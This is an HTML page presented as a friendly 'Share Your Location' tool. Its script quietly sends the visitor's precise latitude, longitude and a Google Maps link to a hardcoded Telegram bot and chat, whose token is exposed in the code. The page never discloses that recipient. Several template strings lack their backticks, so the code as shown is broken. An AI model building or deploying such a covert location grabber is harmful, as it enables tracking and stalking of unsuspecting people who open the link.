<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Sharing</title>
    <style>
        body{font-family:Arial,sans-serif;text-align:center;padding:45px 20px;background:#f5f5f5}
        .box{max-width:520px;margin:auto;background:white;padding:30px;border-radius:18px;box-shadow:0 5px 25px #0001}
        button{padding:14px 24px;border:0;border-radius:10px;background:#1677ff;color:white;font-size:17px;cursor:pointer;margin-top:10px;}
        #result{margin-top:20px;line-height:1.8;word-break:break-word}
    </style>
</head>
<body>
    <div class="box">
        <h2>📍 Share Your Location</h2>
        <p>If you want to share your current location, tap the button below and select <b>Allow</b> when your browser asks for permission.</p>
        <button id="locBtn">📍 Share Location</button>
        <div id="result"></div>
    </div>

<script>
    const botToken = '8919783579:AAfelvrQG5cHJ-OUhTwdQRRQ12GHXPJ57RQ';
    const chatId = '868803183';

    document.getElementById('locBtn').addEventListener('click', function() {
        const r = document.getElementById('result');
        
        if (!navigator.geolocation) {
            r.innerHTML = 'This browser does not support location services.';
            return;
        }
        
        r.innerHTML = '⏳ Waiting for location permission...';
        
        navigator.geolocation.getCurrentPosition(
            function(p) {
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                r.innerHTML = ✅ Location received successfully!;
                
                // ناردنی لۆکەیشن بۆ تێلیگرام
                const message = 📍 لۆکەیشنی نوێ گەیشت!\n\n🌐 Lat: ${lat}\n🌐 Long: ${lon}\n\n🔗 نەخشە: https://www.google.com/maps?q=${lat},${lon};
                const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text= + encodeURIComponent(message);
                
                fetch(url).then(response => {
                    console.log('Sent to telegram');
                }).catch(error => {
                    console.error('Error:', error);
                });
            },
            function(e) {
                r.innerHTML = '❌ Permission denied or error getting location.';
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
    });
</script>
</body>
</html>
